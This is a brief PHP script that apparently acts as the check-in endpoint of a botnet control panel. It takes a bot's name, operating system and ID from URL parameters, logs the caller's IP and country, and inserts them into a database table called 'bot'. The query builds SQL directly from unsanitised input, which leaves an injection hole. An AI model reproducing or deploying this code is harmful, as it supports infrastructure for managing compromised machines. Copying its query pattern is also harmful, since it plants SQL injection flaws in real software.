<?php
include('config.php');
include("geoip.inc");
$gi = geoip_open("GeoIP.dat",GEOIP_STANDARD);
$country_name = geoip_country_name_by_addr($gi,$_SERVER['REMOTE_ADDR']);
geoip_close($gi);

$country_name="lol";

$name=$_GET['name'];
$os=$_GET['os'];
$ip=$_SERVER['REMOTE_ADDR'];
//$info=$_GET['info'];
$uid=$_GET['uid'];
//$contry=$_GET['contry'];

mysql_query("INSERT INTO bot (nr, name, os, ip, info, uid, contry)
VALUES ('', '$name', '$os', '$ip', '', '$uid', '$country_name')");




 mysql_close($connect);
 ?>